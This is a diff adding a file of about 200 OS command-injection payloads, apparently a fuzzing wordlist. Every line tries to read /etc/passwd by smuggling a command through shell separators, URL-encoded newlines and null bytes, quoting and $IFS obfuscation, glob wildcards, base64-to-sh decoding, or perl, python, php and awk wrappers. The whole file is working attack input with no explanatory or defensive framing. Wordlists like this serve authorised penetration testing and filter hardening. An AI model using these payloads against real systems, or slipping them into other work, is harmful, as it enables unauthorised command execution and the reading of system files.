@@ -1,0 +1,202 @@
+; cat /etc/passwd
+;cat /etc/passwd
+;  cat /etc/passwd
+;   cat /etc/passwd
+;    cat /etc/passwd
+| cat /etc/passwd
+|cat /etc/passwd
+|  cat /etc/passwd
+|   cat /etc/passwd
+|    cat /etc/passwd
+|| cat /etc/passwd
+||cat /etc/passwd
+||  cat /etc/passwd
+||   cat /etc/passwd
+||    cat /etc/passwd
+& cat /etc/passwd
+&cat /etc/passwd
+&  cat /etc/passwd
+&   cat /etc/passwd
+&    cat /etc/passwd
+&& cat /etc/passwd
+&&cat /etc/passwd
+&&  cat /etc/passwd
+&&   cat /etc/passwd
+&&    cat /etc/passwd
+%0a cat /etc/passwd
+%0d cat /etc/passwd
+%0a%0d cat /etc/passwd
+\n cat /etc/passwd
+\r cat /etc/passwd
+\r\n cat /etc/passwd
+; cat</etc/passwd
+| cat</etc/passwd
+; cat<>/etc/passwd
+| cat<>/etc/passwd
+; cat /e\tc/p\asswd
+| cat /e\tc/p\asswd
+; cat /etc/pass'w'd
+| cat /etc/pass'w'd
+; cat /etc/pass"w"d
+| cat /etc/pass"w"d
+; cat /etc/passw''d
+| cat /etc/passw''d
+; cat /etc/passw""d
+| cat /etc/passw""d
+; c'a't /etc/passwd
+| c'a't /etc/passwd
+; c"a"t /etc/passwd
+| c"a"t /etc/passwd
+; ca\t /etc/passwd
+| ca\t /etc/passwd
+; /bin/cat /etc/passwd
+| /bin/cat /etc/passwd
+; /usr/bin/cat /etc/passwd
+| /usr/bin/cat /etc/passwd
+; cat${IFS}/etc/passwd
+| cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+| cat$IFS/etc/passwd
+; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+| cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+; cat$IFS$9/etc/passwd
+| cat$IFS$9/etc/passwd
+; cat${IFS}${1}/etc/passwd
+| cat${IFS}${1}/etc/passwd
+; cat</etc/passwd;
+| cat</etc/passwd;
+; {cat,/etc/passwd}
+| {cat,/etc/passwd}
+; X=$'cat\x20/etc/passwd'&&$X
+| X=$'cat\x20/etc/passwd'&&$X
+; sh -c "cat /etc/passwd"
+| sh -c "cat /etc/passwd"
+; bash -c "cat /etc/passwd"
+| bash -c "cat /etc/passwd"
+; /bin/sh -c "cat /etc/passwd"
+| /bin/sh -c "cat /etc/passwd"
+; /bin/bash -c "cat /etc/passwd"
+| /bin/bash -c "cat /etc/passwd"
+; `cat /etc/passwd`
+| `cat /etc/passwd`
+; $(cat /etc/passwd)
+| $(cat /etc/passwd)
+; cat /etc/passwd #
+| cat /etc/passwd #
+; cat /etc/passwd;#
+| cat /etc/passwd;#
+; cat /etc/passwd //
+| cat /etc/passwd //
+; cat /etc/passwd;
+| cat /etc/passwd;
+; cat /etc/passwd|
+| cat /etc/passwd|
+; cat /etc/passwd||
+| cat /etc/passwd||
+; cat /etc/passwd&&
+| cat /etc/passwd&&
+; cat /etc/passwd&
+| cat /etc/passwd&
+%00; cat /etc/passwd
+%00| cat /etc/passwd
+%00|| cat /etc/passwd
+%00& cat /etc/passwd
+%00&& cat /etc/passwd
+; %00cat /etc/passwd
+| %00cat /etc/passwd
+; cat%00 /etc/passwd
+| cat%00 /etc/passwd
+; cat /etc/passwd%00
+| cat /etc/passwd%00
+;%20cat%20/etc/passwd
+|%20cat%20/etc/passwd
+;cat%20/etc/passwd
+|cat%20/etc/passwd
+%3bcat%20/etc/passwd
+%7ccat%20/etc/passwd
+; cat /etc/passwd%0a
+| cat /etc/passwd%0a
+; cat /etc/passwd%0d
+| cat /etc/passwd%0d
+; cat /etc/passwd\n
+| cat /etc/passwd\n
+; cat /etc/passwd\r
+| cat /etc/passwd\r
+;${IFS}cat${IFS}/etc/passwd
+|${IFS}cat${IFS}/etc/passwd
+;$IFS$9cat$IFS$9/etc/passwd
+|$IFS$9cat$IFS$9/etc/passwd
+; /???/??t /???/??ss??
+| /???/??t /???/??ss??
+; /???/c?t /???/p?ss??
+| /???/c?t /???/p?ss??
+; /b??/c?? /e??/p??s??
+| /b??/c?? /e??/p??s??
+; /b*/c* /e*/p*ss*
+| /b*/c* /e*/p*ss*
+; cat /e*c/p*ss*d
+| cat /e*c/p*ss*d
+; cat /*tc/p*sswd
+| cat /*tc/p*sswd
+; cat /*/*/passwd
+| cat /*/*/passwd
+; cat /*/*/*wd
+| cat /*/*/*wd
+%0acat%20/etc/passwd
+%0dcat%20/etc/passwd
+%0a%0dcat%20/etc/passwd
+\ncat /etc/passwd
+\rcat /etc/passwd
+\r\ncat /etc/passwd
+; cat</dev/null</etc/passwd
+| cat</dev/null</etc/passwd
+; (cat /etc/passwd)
+| (cat /etc/passwd)
+; { cat /etc/passwd; }
+| { cat /etc/passwd; }
+; [cat /etc/passwd]
+| [cat /etc/passwd]
+; cat /etc/passwd || id
+| cat /etc/passwd || id
+; cat /etc/passwd && id
+| cat /etc/passwd && id
+; cat /etc/passwd | id
+| cat /etc/passwd | id
+; cat /etc/passwd ; id
+| cat /etc/passwd ; id
+; cat /etc/passwd & id
+| cat /etc/passwd & id
+; a=c;b=at;$a$b /etc/passwd
+| a=c;b=at;$a$b /etc/passwd
+; echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+| echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+; perl -e 'system("cat /etc/passwd")'
+| perl -e 'system("cat /etc/passwd")'
+; python -c 'import os;os.system("cat /etc/passwd")'
+| python -c 'import os;os.system("cat /etc/passwd")'
+; ruby -e 'system("cat /etc/passwd")'
+| ruby -e 'system("cat /etc/passwd")'
+; php -r 'system("cat /etc/passwd");'
+| php -r 'system("cat /etc/passwd");'
+; awk 'BEGIN {system("cat /etc/passwd")}'
+| awk 'BEGIN {system("cat /etc/passwd")}'
+; cat$u /etc/passwd
+| cat$u /etc/passwd
+; cat$@ /etc/passwd
+| cat$@ /etc/passwd
+; cat$* /etc/passwd
+| cat$* /etc/passwd
+; cat${x} /etc/passwd
+| cat${x} /etc/passwd
+; cat${u} /etc/passwd
+| cat${u} /etc/passwd
+; cat${@} /etc/passwd
+| cat${@} /etc/passwd
+; cat${*} /etc/passwd
+| cat${*} /etc/passwd
+; c$@a$@t$@ /etc/passwd
+| c$@a$@t$@ /etc/passwd
+; ca$()t /etc/passwd
+| ca$()t /etc/passwd
+; ca${}t /etc/passwd
+| ca${}t /etc/passwd
